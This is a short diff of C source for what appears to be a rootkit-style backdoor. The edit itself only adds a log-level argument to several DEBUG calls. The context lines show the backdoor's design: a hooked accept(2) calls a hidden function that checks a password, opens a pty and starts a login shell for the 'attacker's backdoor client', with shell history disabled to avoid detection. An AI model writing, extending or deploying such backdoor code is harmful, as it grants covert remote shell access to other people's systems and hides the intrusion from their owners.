@@ -32,7 +32,7 @@
 /** ensure that given password is valid.
  */
 static int  check_shell_password(int sock) {
-    DEBUG("check_shell_password() called.");
+    DEBUG(D_INFO, "check_shell_password() called.");
 
     char    buffer[sizeof(PASSWORD)] = {0};
 
@@ -62,7 +62,7 @@ static int  close_socket(int sock) {
 /** execute a login shell process
  */
 static void start_interactive_shell(int sock, int *pty, int *tty) {
-    DEBUG("start_interactive_shell() called");
+    DEBUG(D_INFO, "start_interactive_shell() called");
 
     char * const args[] = {SHELL_TYPE, "-l", NULL};
     char * const env[] = {_ENV_IS_ATTACKER, _ENV_NO_HISTFILE, _ENV_XTERM, NULL};
@@ -140,7 +140,7 @@ static void shell_loop(int sock, int pty) {
  * server and attacker's backdoor client.
  */
 static int  drop_pty_connection(int sock) {
-    DEBUG("drop_pty_connection() called");
+    DEBUG(D_INFO, "drop_pty_connection() called");
 
     int     pty, tty;
     char    pty_name[5 + 255 + 1]; // "/dev/" + MAX_NAME_SZ + "\0"
@@ -186,7 +186,7 @@ static int  drop_pty_connection(int sock) {
  * this hidden function is called by accept(2) hook.
  */
 int         drop_shell_backdoor(int sock, struct sockaddr *addr) {
-    DEBUG("drop_backdoor_shell() called.");
+    DEBUG(D_INFO, "drop_backdoor_shell() called.");
 
     struct sockaddr_in *sa_in;
     uint16_t sin_port;
